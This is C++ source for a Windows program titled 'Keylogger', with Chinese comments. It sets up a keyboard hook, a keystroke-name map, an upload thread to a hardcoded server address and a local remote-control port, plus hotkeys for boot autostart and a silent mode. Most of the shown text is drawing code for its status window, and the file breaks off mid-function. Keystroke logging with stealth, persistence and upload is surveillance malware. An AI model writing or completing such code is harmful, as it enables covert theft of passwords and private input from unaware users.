#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <dwmapi.h>
#include <gdiplus.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <regex>
#include <algorithm>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <cstring>
#include <cstdio>
#include <sstream>
#include <time.h>
#include <map>
#include <shlwapi.h>
#include <shellapi.h>
#include <atomic>
#include <shlobj.h>
#include <objbase.h>
#include <shobjidl.h>
#include <thread>
#include <mutex>
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

using json = nlohmann::json;
namespace fs = std::filesystem;

#define invisible
#define bootwait
#define FORMAT 0
#define mouseignore

bool isRecording = true;
HHOOK _hook;

std::atomic<bool> uploadEnabled{ false };
std::atomic<bool> uploadThreadRunning{ false };
HANDLE hUploadThread = NULL;

std::atomic<bool> serverControlEnabled{ true };
std::atomic<bool> serverThreadRunning{ false };
HANDLE hServerThread = NULL;
std::string g_serverHost = "10.88.202.73";
int g_serverPort = 5244;
int g_localPort = 9999;
std::mutex g_configMutex;

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s);
std::string readFileContent(const std::string& filePath);
std::string getExecutableDir();

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]" },
    {VK_RETURN, "\n" },
    {VK_SPACE, "_" },
    {VK_TAB, "[TAB]" },
    {VK_SHIFT, "[SHIFT]" },
    {VK_LSHIFT, "[LSHIFT]" },
    {VK_RSHIFT, "[RSHIFT]" },
    {VK_CONTROL, "[CONTROL]" },
    {VK_LCONTROL, "[LCONTROL]" },
    {VK_RCONTROL, "[RCONTROL]" },
    {VK_MENU, "[ALT]" },
    {VK_LWIN, "[LWIN]" },
    {VK_RWIN, "[RWIN]" },
    {VK_ESCAPE, "[ESCAPE]" },
    {VK_END, "[END]" },
    {VK_HOME, "[HOME]" },
    {VK_LEFT, "[LEFT]" },
    {VK_RIGHT, "[RIGHT]" },
    {VK_UP, "[UP]" },
    {VK_DOWN, "[DOWN]" },
    {VK_PRIOR, "[PG_UP]" },
    {VK_NEXT, "[PG_DOWN]" },
    {VK_OEM_PERIOD, "." },
    {VK_DECIMAL, "." },
    {VK_OEM_PLUS, "+" },
    {VK_OEM_MINUS, "-" },
    {VK_ADD, "+" },
    {VK_SUBTRACT, "-" },
    {VK_CAPITAL, "[CAPSLOCK]" },
};
#endif

static HWND g_hNotifyWnd = NULL;
static UINT g_nNotifyId = 0;

LRESULT CALLBACK NotifyWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

void InitNotifyWindow()
{
    if (g_hNotifyWnd != NULL) return;
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = NotifyWndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"KeyloggerNotifyClass";
    RegisterClass(&wc);
    g_hNotifyWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, wc.hInstance, NULL);
    if (g_hNotifyWnd) g_nNotifyId = (UINT)(ULONG_PTR)g_hNotifyWnd;
}

enum FadeState { FADE_IN, SHOW, FADE_OUT };

const int ANIMATION_STEP_MS = 16;
const int FADE_DURATION_MS = 300;
const BYTE TARGET_ALPHA = 64;

struct AnimationData
{
    FadeState state;
    BYTE currentAlpha;
    int elapsedMs;
    int showDurationMs;
};

LRESULT CALLBACK TransparentWindowProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (msg == WM_TIMER)
    {
        AnimationData* data = (AnimationData*)GetWindowLongPtr(hWnd, GWLP_USERDATA);
        if (!data) return DefWindowProc(hWnd, msg, wParam, lParam);

        switch (data->state)
        {
        case FADE_IN:
        {
            data->elapsedMs += ANIMATION_STEP_MS;
            float progress = min((float)data->elapsedMs / FADE_DURATION_MS, 1.0f);
            data->currentAlpha = (BYTE)(TARGET_ALPHA * progress);
            SetLayeredWindowAttributes(hWnd, 0, data->currentAlpha, LWA_ALPHA);

            if (data->elapsedMs >= FADE_DURATION_MS)
            {
                data->state = SHOW;
                data->elapsedMs = 0;
            }
            break;
        }
        case SHOW:
        {
            data->elapsedMs += ANIMATION_STEP_MS;
            if (data->elapsedMs >= data->showDurationMs)
            {
                data->state = FADE_OUT;
                data->elapsedMs = 0;
            }
            break;
        }
        case FADE_OUT:
        {
            data->elapsedMs += ANIMATION_STEP_MS;
            float progress = min((float)data->elapsedMs / FADE_DURATION_MS, 1.0f);
            data->currentAlpha = (BYTE)(TARGET_ALPHA * (1.0f - progress));
            SetLayeredWindowAttributes(hWnd, 0, data->currentAlpha, LWA_ALPHA);

            if (data->elapsedMs >= FADE_DURATION_MS)
            {
                KillTimer(hWnd, 1);
                delete data;
                SetWindowLongPtr(hWnd, GWLP_USERDATA, 0);
                DestroyWindow(hWnd);
                return 0;
            }
            break;
        }
        }
        return 0;
    }

    return DefWindowProc(hWnd, msg, wParam, lParam);
}

void ShowTransparentSquare(HWND parent, COLORREF color, int durationMs = 1000)
{
    static bool classRegistered = false;
    static const wchar_t* className = L"TransparentSquareClass";
    static HWND hCurrentSquare = NULL; // 存储当前的色块窗口句柄

    if (!classRegistered)
    {
        WNDCLASS wc = { 0 };
        wc.lpfnWndProc = TransparentWindowProc;
        wc.hInstance = GetModuleHandle(NULL);
        wc.lpszClassName = className;
        wc.hCursor = NULL;
        RegisterClass(&wc);
        classRegistered = true;
    }

    // 如果已经存在色块窗口，先关闭它
    if (hCurrentSquare && IsWindow(hCurrentSquare))
    {
        KillTimer(hCurrentSquare, 1);
        DestroyWindow(hCurrentSquare);
        hCurrentSquare = NULL;
    }

    RECT taskbarRect;
    HWND taskbar = FindWindow(L"Shell_TrayWnd", NULL);
    if (taskbar)
    {
        GetWindowRect(taskbar, &taskbarRect);
    }
    else
    {
        SystemParametersInfo(SPI_GETWORKAREA, 0, &taskbarRect, 0);
    }

    int squareSize = 40;
    int x = taskbarRect.right - squareSize - 10;
    int y = taskbarRect.top - squareSize - 10;

    // 即使 parent 为 NULL，也能创建色块窗口
    HWND hWnd = CreateWindowEx(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_NOACTIVATE | WS_EX_TOOLWINDOW,
        className,
        NULL,
        WS_POPUP | WS_VISIBLE,
        x, y, squareSize, squareSize,
        parent, // 即使为 NULL，也可以创建窗口
        NULL,
        GetModuleHandle(NULL),
        NULL
    );

    if (hWnd)
    {
        hCurrentSquare = hWnd; // 更新当前色块窗口句柄
        SetLayeredWindowAttributes(hWnd, 0, 0, LWA_ALPHA);

        HDC hdc = GetDC(hWnd);
        if (hdc)
        {
            HBRUSH brush = CreateSolidBrush(color);
            RECT rect = { 0, 0, squareSize, squareSize };
            FillRect(hdc, &rect, brush);
            DeleteObject(brush);
            ReleaseDC(hWnd, hdc);
        }

        AnimationData* data = new AnimationData{ FADE_IN, 0, 0, durationMs };
        SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)data);
        SetTimer(hWnd, 1, ANIMATION_STEP_MS, NULL);
    }
}

void ShowToastNotification(const std::wstring& title, const std::wstring& content)
{
    InitNotifyWindow();
    if (!g_hNotifyWnd)
    {
        MessageBox(NULL, content.c_str(), title.c_str(), MB_OK);
        return;
    }

    NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
    nid.hWnd = g_hNotifyWnd;
    nid.uID = g_nNotifyId;
    nid.uFlags = NIF_ICON | NIF_TIP | NIF_INFO;
    nid.dwInfoFlags = NIIF_INFO;
    wcscpy_s(nid.szInfo, content.c_str());
    wcscpy_s(nid.szInfoTitle, title.c_str());
    nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);

    if (!Shell_NotifyIconW(NIM_ADD, &nid))
    {
        Shell_NotifyIconW(NIM_MODIFY, &nid);
    }
    else
    {
        struct DelayedCleanupData { 
            HWND hWnd; 
            UINT uID; 
        } *pData = new DelayedCleanupData{ g_hNotifyWnd, g_nNotifyId };
        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
            DelayedCleanupData* data = (DelayedCleanupData*)p;
            Sleep(10000);
            NOTIFYICONDATAW delNid = { sizeof(NOTIFYICONDATAW) };
            delNid.hWnd = data->hWnd;
            delNid.uID = data->uID;
            Shell_NotifyIconW(NIM_DELETE, &delNid);
            delete data;
            return 0;
            }, pData, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
}

void CleanupNotifyIcon()
{
    if (g_hNotifyWnd)
    {
        NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
        nid.hWnd = g_hNotifyWnd;
        nid.uID = g_nNotifyId;
        Shell_NotifyIconW(NIM_DELETE, &nid);
        DestroyWindow(g_hNotifyWnd);
        g_hNotifyWnd = NULL;
    }
}

// 欢迎窗口相关代码
HWND g_hWelcomeWnd = NULL;
POINT g_mousePos = { -1, -1 };
bool g_isButtonPressed = false;
bool g_isDragging = false;
POINT g_dragStartPos;

// 现代颜色方案
#define COLOR_BACKGROUND RGB(255, 255, 255)
#define COLOR_PRIMARY RGB(255, 255, 255)
#define COLOR_PRIMARY_DARK RGB(240, 240, 240)
#define COLOR_TEXT RGB(31, 41, 55)
#define COLOR_TEXT_LIGHT RGB(75, 85, 99)
#define COLOR_ACCENT RGB(16, 185, 129)
#define COLOR_BORDER RGB(229, 231, 235)
#define COLOR_BUTTON_HOVER RGB(209, 213, 219)
#define COLOR_BUTTON_PRESSED RGB(191, 219, 254)

LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
    case WM_CREATE:
    {
        // 确保窗口大小固定，移除可调整大小的样式
        DWORD style = GetWindowLong(hWnd, GWL_STYLE);
        style &= ~(WS_THICKFRAME | WS_SIZEBOX);
        SetWindowLong(hWnd, GWL_STYLE, style);
        
        // 设置窗口为分层窗口以支持半透明效果和阴影
        SetWindowLong(hWnd, GWL_EXSTYLE, GetWindowLong(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED);
        
        // 初始化鼠标位置
        g_mousePos = { -1, -1 };
        g_isButtonPressed = false;
        g_isDragging = false;
        
        // 启用窗口阴影
        BOOL bEnable = TRUE;
        DwmSetWindowAttribute(hWnd, DWMWA_NCRENDERING_POLICY, &bEnable, sizeof(bEnable));
        
        // 设置窗口边框颜色（可选）
        COLORREF clrBorder = RGB(229, 231, 235);
        DwmSetWindowAttribute(hWnd, DWMWA_BORDER_COLOR, &clrBorder, sizeof(clrBorder));
        
        // 创建窗口阴影
        DWMNCRENDERINGPOLICY ncrp = DWMNCRP_ENABLED;
        DwmSetWindowAttribute(hWnd, DWMWA_NCRENDERING_POLICY, &ncrp, sizeof(ncrp));
        
        // 为窗口添加阴影效果
        MARGINS margins = { 1, 1, 1, 1 };
        DwmExtendFrameIntoClientArea(hWnd, &margins);
        
        return 0;
    }
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        
        // 绘制背景（带圆角）
        RECT rect;
        GetClientRect(hWnd, &rect);
        HBRUSH bgBrush = CreateSolidBrush(RGB(255, 255, 255));
        
        // 创建圆角路径
        HRGN hRgn = CreateRoundRectRgn(0, 0, rect.right, rect.bottom, 15, 15);
        SelectClipRgn(hdc, hRgn);
        FillRect(hdc, &rect, bgBrush);
        DeleteObject(hRgn);
        DeleteObject(bgBrush);
        
        // 绘制标题栏
        RECT headerRect = { 0, 0, rect.right, 40 };
        HBRUSH titleBrush = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(hdc, &headerRect, titleBrush);
        DeleteObject(titleBrush);
        
        // 绘制标题栏边框
        HPEN borderPen = CreatePen(PS_SOLID, 1, RGB(229, 231, 235));
        HPEN oldPen = (HPEN)SelectObject(hdc, borderPen);
        MoveToEx(hdc, 0, 40, NULL);
        LineTo(hdc, rect.right, 40);
        SelectObject(hdc, oldPen);
        DeleteObject(borderPen);
        
        // 绘制标题文本
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(31, 41, 55));
        HFONT titleFont = CreateFont(22, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
        HFONT oldFont = (HFONT)SelectObject(hdc, titleFont);
        DrawTextW(hdc, L"Keylogger", -1, &headerRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        SelectObject(hdc, oldFont);
        DeleteObject(titleFont);
        
        // 绘制内容区域
        RECT contentRect = { 20, 60, rect.right - 20, rect.bottom - 60 };
        SetTextColor(hdc, RGB(31, 41, 55));
        
        // 显示当前状态和快捷键说明
        std::wstring statusText = isRecording ? L"录制中" : L"已暂停";
        
        // 绘制状态信息
        SetTextColor(hdc, RGB(31, 41, 55));
        HFONT statusFont = CreateFont(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
        SelectObject(hdc, statusFont);
        std::wstring statusLine = L"当前状态: " + statusText;
        RECT statusRect = { contentRect.left, contentRect.top, contentRect.right, contentRect.top + 35 };
        DrawTextW(hdc, statusLine.c_str(), -1, &statusRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        DeleteObject(statusFont);
        
        // 绘制快捷键说明
        HFONT shortcutFont = CreateFont(17, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
        SelectObject(hdc, shortcutFont);
        
        // 绘制快捷键说明标题
        RECT shortcutRect = { contentRect.left, contentRect.top + 40, contentRect.right, contentRect.bottom };
        SetTextColor(hdc, RGB(31, 41, 55));
        RECT titleRect = shortcutRect;
        titleRect.bottom = titleRect.top + 25;
        DrawTextW(hdc, L"快捷键说明:", -1, &titleRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        
        // 绘制快捷键列表
        int lineHeight = 25;
        int currentY = titleRect.bottom + 5;
        
        // 快捷键1
        RECT keyRect = { shortcutRect.left, currentY, shortcutRect.left + 180, currentY + lineHeight };
        SetTextColor(hdc, RGB(59, 130, 246)); // 蓝色
        DrawTextW(hdc, L"Ctrl + Shift + Alt + P", -1, &keyRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        
        RECT funcRect = { shortcutRect.left + 180, currentY, shortcutRect.right, currentY + lineHeight };
        SetTextColor(hdc, RGB(31, 41, 55));
        DrawTextW(hdc, L"暂停/继续录制", -1, &funcRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight;
        
        // 快捷键2
        keyRect.top = currentY;
        keyRect.bottom = currentY + lineHeight;
        SetTextColor(hdc, RGB(59, 130, 246)); // 蓝色
        DrawTextW(hdc, L"Ctrl + Shift + Alt + Q", -1, &keyRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        
        funcRect.top = currentY;
        funcRect.bottom = currentY + lineHeight;
        SetTextColor(hdc, RGB(31, 41, 55));
        DrawTextW(hdc, L"停止录制", -1, &funcRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight;
        
        // 快捷键3
        keyRect.top = currentY;
        keyRect.bottom = currentY + lineHeight;
        SetTextColor(hdc, RGB(59, 130, 246)); // 蓝色
        DrawTextW(hdc, L"Ctrl + Shift + Alt + S", -1, &keyRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        
        funcRect.top = currentY;
        funcRect.bottom = currentY + lineHeight;
        SetTextColor(hdc, RGB(31, 41, 55));
        DrawTextW(hdc, L"启用/禁用开机自启", -1, &funcRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight;
        
        // 快捷键4
        keyRect.top = currentY;
        keyRect.bottom = currentY + lineHeight;
        SetTextColor(hdc, RGB(59, 130, 246)); // 蓝色
        DrawTextW(hdc, L"Ctrl + Shift + Alt + D", -1, &keyRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        
        funcRect.top = currentY;
        funcRect.bottom = currentY + lineHeight;
        SetTextColor(hdc, RGB(31, 41, 55));
        DrawTextW(hdc, L"启用/禁用静默模式", -1, &funcRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight + 5;
        
        // 绘制日志保存位置
        RECT logRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
        SetTextColor(hdc, RGB(16, 185, 129)); // 绿色
        DrawTextW(hdc, L"日志保存在 %appdata%\\Keylogger", -1, &logRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight;
        
        // 绘制服务器控制端口
        RECT portRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
        SetTextColor(hdc, RGB(16, 185, 129)); // 绿色
        std::wstring portText = L"服务器控制端口: " + std::to_wstring(g_localPort);
        DrawTextW(hdc, portText.c_str(), -1, &portRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight + 5;
        
        // 绘制色块显示功能说明
        RECT colorRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
        SetTextColor(hdc, RGB(107, 114, 128)); // 淡灰色
        DrawTextW(hdc, L"色块显示功能:", -1, &colorRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight;
        
        // 绘制颜色对应意义
        int colorBoxSize = 12;
        int colorBoxMargin = 5;
        
        // 绿色 - 继续录制
        RECT greenRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
        SetTextColor(hdc, RGB(107, 114, 128)); // 淡灰色
        RECT greenBoxRect = { greenRect.left, greenRect.top + (lineHeight - colorBoxSize) / 2, greenRect.left + colorBoxSize, greenRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
        HBRUSH greenBrush = CreateSolidBrush(RGB(0, 255, 0));
        FillRect(hdc, &greenBoxRect, greenBrush);
        DeleteObject(greenBrush);
        RECT greenTextRect = { greenBoxRect.right + colorBoxMargin, greenRect.top, greenRect.right, greenRect.bottom };
        DrawTextW(hdc, L"绿色 - 继续录制", -1, &greenTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight;
        
        // 红色 - 暂停/停止录制或错误
        RECT redRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
        SetTextColor(hdc, RGB(107, 114, 128)); // 淡灰色
        RECT redBoxRect = { redRect.left, redRect.top + (lineHeight - colorBoxSize) / 2, redRect.left + colorBoxSize, redRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
        HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
        FillRect(hdc, &redBoxRect, redBrush);
        DeleteObject(redBrush);
        RECT redTextRect = { redBoxRect.right + colorBoxMargin, redRect.top, redRect.right, redRect.bottom };
        DrawTextW(hdc, L"红色 - 暂停/停止录制或错误", -1, &redTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight;
        
        // 蓝色 - 启用开机自启
        RECT blueRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
        SetTextColor(hdc, RGB(107, 114, 128)); // 淡灰色
        RECT blueBoxRect = { blueRect.left, blueRect.top + (lineHeight - colorBoxSize) / 2, blueRect.left + colorBoxSize, blueRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
        HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));
        FillRect(hdc, &blueBoxRect, blueBrush);
        DeleteObject(blueBrush);
        RECT blueTextRect = { blueBoxRect.right + colorBoxMargin, blueRect.top, blueRect.right, blueRect.bottom };
        DrawTextW(hdc, L"蓝色 - 启用开机自启", -1, &blueTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight;
        
        // 浅蓝色 - 禁用开机自启
        RECT lightBlueRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
        SetTextColor(hdc, RGB(107, 114, 128)); // 淡灰色
        RECT lightBlueBoxRect = { lightBlueRect.left, lightBlueRect.top + (lineHeight - colorBoxSize) / 2, lightBlueRect.left + colorBoxSize, lightBlueRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
        HBRUSH lightBlueBrush = CreateSolidBrush(RGB(0, 128, 255));
        FillRect(hdc, &lightBlueBoxRect, lightBlueBrush);
        DeleteObject(lightBlueBrush);
        RECT lightBlueTextRect = { lightBlueBoxRect.right + colorBoxMargin, lightBlueRect.top, lightBlueRect.right, lightBlueRect.bottom };
        DrawTextW(hdc, L"浅蓝色 - 禁用开机自启", -1, &lightBlueTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight;
        
        // 黄色 - 启用静默模式
        RECT yellowRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
        SetTextColor(hdc, RGB(107, 114, 128)); // 淡灰色
        RECT yellowBoxRect = { yellowRect.left, yellowRect.top + (lineHeight - colorBoxSize) / 2, yellowRect.left + colorBoxSize, yellowRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
        HBRUSH yellowBrush = CreateSolidBrush(RGB(255, 255, 0));
        FillRect(hdc, &yellowBoxRect, yellowBrush);
        DeleteObject(yellowBrush);
        RECT yellowTextRect = { yellowBoxRect.right + colorBoxMargin, yellowRect.top, yellowRect.right, yellowRect.bottom };
        DrawTextW(hdc, L"黄色 - 启用静默模式", -1, &yellowTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        currentY += lineHeight;
        
        // 橙色 - 禁用静默模式
        RECT orangeRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
        SetTextColor(hdc, RGB(107, 114, 128)); // 淡灰色
        RECT orangeBoxRect = { orangeRect.left, orangeRect.top + (lineHeight - colorBoxSize) / 2, orangeRect.left + colorBoxSize, orangeRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
        HBRUSH orangeBrush = CreateSolidBrush(RGB(255, 192, 0));
        FillRect(hdc, &orangeBoxRect, orangeBrush);
        DeleteObject(orangeBrush);
        RECT orangeTextRect = { orangeBoxRect.right + colorBoxMargin, orangeRect.top, orangeRect.right, orangeRect.bottom };
        DrawTextW(hdc, L"橙色 - 禁用静默模式", -1, &orangeTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        
        SelectObject(hdc, oldFont);
        DeleteObject(shortcutFont);
        
        // 绘制确定按钮
        RECT buttonRect = { rect.right - 120, rect.bottom - 45, rect.right - 25, rect.bottom - 20 };
        
        // 检查鼠标是否在按钮上
        POINT pt = g_mousePos;
        bool isHover = false;
        if (pt.x != -1 && pt.y != -1)
        {
            isHover = PtInRect(&buttonRect, pt);
        }
        
        // 绘制确定按钮（使用GDI+抗锯齿）
        Gdiplus::Graphics graphics(hdc);
        graphics.SetSmoothingMode(Gdiplus::SmoothingModeAntiAlias);
        graphics.SetTextRenderingHint(Gdiplus::TextRenderingHintClearTypeGridFit);
        
        // 定义按钮颜色
        Gdiplus::Color bgColor, borderColor;
        if (g_isButtonPressed)
        {
            bgColor = Gdiplus::Color(255, 209, 213, 219); // 中灰色
            borderColor = Gdiplus::Color(255, 191, 219, 254); // 浅蓝色边框
        }
        else if (isHover)
        {
            bgColor = Gdiplus::Color(255, 231, 241, 255); // 浅蓝色背景
            borderColor = Gdiplus::Color(255, 59, 130, 246); // 蓝色边框
        }
        else
        {
            bgColor = Gdiplus::Color(255, 255, 255, 255); // 白色背景
            borderColor = Gdiplus::Color(255, 229, 231, 235); // 浅灰色边框
        }
        
        // 绘制按钮背景（带圆角）
        int radius = 10;
        Gdiplus::RectF rectF((float)buttonRect.left, (float)buttonRect.top, 
                            (float)(buttonRect.right - buttonRect.left), 
                            (float)(buttonRect.bottom - buttonRect.top));
        Gdiplus::GraphicsPath path;
        
        // 手动创建圆角矩形路径
        float width = rectF.Width;
        float height = rectF.Height;
        float x = rectF.X;
        float y = rectF.Y;
        
        path.StartFigure();
        path.AddArc(static_cast<REAL>(x), static_cast<REAL>(y), 
                   static_cast<REAL>(radius * 2), static_cast<REAL>(radius * 2), 
                   180.0f, 90.0f);
        path.AddLine(static_cast<REAL>(x + radius), static_cast<REAL>(y), 
                     static_cast<REAL>(x + width - radius), static_cast<REAL>(y));
        path.AddArc(static_cast<REAL>(x + width - radius * 2), static_cast<REAL>(y), 
                   static_cast<REAL>(radius * 2), static_cast<REAL>(radius * 2), 
                   270.0f, 90.0f);
        path.AddLine(static_cast<REAL>(x + width), static_cast<REAL>(y + radius), 
                     static_cast<REAL>(x + width), static_cast<REAL>(y + height - radius));
        path.AddArc(static_cast<REAL>(x + width - radius * 2), static_cast<REAL>(y + height - radius * 2), 
                   static_cast<REAL>(radius * 2), static_cast<REAL>(radius * 2), 
                   0.0f, 90.0f);
        path.AddLine(static_cast<REAL>(x + width - radius), static_cast<REAL>(y + height), 
                     static_cast<REAL>(x + radius), static_cast<REAL>(y + height));
        path.AddArc(static_cast<REAL>(x), static_cast<REAL>(y + height - radius * 2), 
                   static_cast<REAL>(radius * 2), static_cast<REAL>(radius * 2), 
                   90.0f, 90.0f);
        path.AddLine(static_cast<REAL>(x), static_cast<REAL>(y + height - radius), 
                     static_cast<REAL>(x), static_cast<REAL>(y + radius));
        path.CloseFigure();
        
        Gdiplus::SolidBrush brush(bgColor);
        graphics.FillPath(&brush, &path);
        
        // 绘制按钮边框（带圆角）
        Gdiplus::Pen pen(borderColor, g_isButtonPressed || isHover ? 2.0f : 1.0f);
        graphics.DrawPath(&pen, &path);
        
        // 绘制按钮文本
        Gdiplus::FontFamily fontFamily(L"Segoe UI");
        Gdiplus::Font font(&fontFamily, 14.0f, Gdiplus::FontStyleRegular, Gdiplus::UnitPixel);
        Gdiplus::SolidBrush textBrush(Gdiplus::Color(255, 31, 41, 55)); // 深色文本
        
        Gdiplus::StringFormat stringFormat;
        stringFormat.SetAlignment(Gdiplus::StringAlignmentCenter);
        stringFormat.SetLineAlignment(Gdiplus::StringAlignmentCenter);
        
        graphics.DrawString(L"确定", -1, &font, rectF, &stringFormat, &textBrush);
        
        EndPaint(hWnd, &ps);
        return 0;
    }
    case WM_MOUSEMOVE:
    {
        POINT pt;
        GetCursorPos(&pt);
        ScreenToClient(hWnd, &pt);
        
        // 检查鼠标是否在按钮上
        RECT rect;
        GetClientRect(hWnd, &rect);
        RECT buttonRect = { rect.right - 120, rect.bottom - 45, rect.right - 20, rect.bottom - 15 };
        
        bool isHover = PtInRect(&buttonRect, pt);
        POINT oldPos = g_mousePos;
        g_mousePos = pt;
        
        // 处理窗口移动
        if (g_isDragging)
        {
            POINT currentPos;
            GetCursorPos(&currentPos);
            
            RECT windowRect;
            GetWindowRect(hWnd, &windowRect);
            
            int dx = currentPos.x - g_dragStartPos.x;
            int dy = currentPos.y - g_dragStartPos.y;
            
            SetWindowPos(hWnd, NULL, windowRect.left + dx, windowRect.top + dy, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
            
            g_dragStartPos = currentPos;
        }
        // 如果按钮未被按下，并且鼠标进入或离开按钮区域，重绘窗口
        else if (!g_isButtonPressed && ((oldPos.x == -1 && oldPos.y == -1) || 
            (!PtInRect(&buttonRect, oldPos) && isHover) || 
            (PtInRect(&buttonRect, oldPos) && !isHover)))
        {
            InvalidateRect(hWnd, &buttonRect, FALSE);
        }
        return 0;
    }
    case WM_MOUSELEAVE:
    {
        // 只有当按钮未被按下时，才重置鼠标位置和重绘按钮
        if (!g_isButtonPressed)
        {
            g_mousePos = { -1, -1 };
            RECT rect;
            GetClientRect(hWnd, &rect);
            RECT buttonRect = { rect.right - 120, rect.bottom - 45, rect.right - 20, rect.bottom - 15 };
            InvalidateRect(hWnd, &buttonRect, FALSE);
        }
        return 0;
    }
    case WM_LBUTTONDOWN:
    {
        POINT pt;
        GetCursorPos(&pt);
        ScreenToClient(hWnd, &pt);
        
        RECT rect;
        GetClientRect(hWnd, &rect);
        RECT buttonRect = { rect.right - 120, rect.bottom - 45, rect.right - 20, rect.bottom - 15 };
        
        // 检查是否点击了标题栏区域
        RECT titleBarRect = { 0, 0, rect.right, 40 };
        if (PtInRect(&titleBarRect, pt) && !PtInRect(&buttonRect, pt))
        {
            // 开始拖动窗口
            g_isDragging = true;
            GetCursorPos(&g_dragStartPos);
            SetCapture(hWnd);
        }
        else if (PtInRect(&buttonRect, pt))
        {
            // 设置按钮为按下状态
            g_isButtonPressed = true;
            InvalidateRect(hWnd, &buttonRect, FALSE);
        }
        return 0;
    }
    case WM_LBUTTONUP:
    {
        POINT pt;
        GetCursorPos(&pt);
        ScreenToClient(hWnd, &pt);
        
        RECT rect;
        GetClientRect(hWnd, &rect);
        RECT buttonRect = { rect.right - 120, rect.bottom - 45, rect.right - 20, rect.bottom - 15 };
        
        // 结束拖动
        if (g_isDragging)
        {
            g_isDragging = false;
            ReleaseCapture();
        }
        // 恢复按钮状态
        else if (g_isButtonPressed)
        {
            g_isButtonPressed = false;
            InvalidateRect(hWnd, &buttonRect, FALSE);
            
            // 如果鼠标在按钮上，执行按钮点击操作
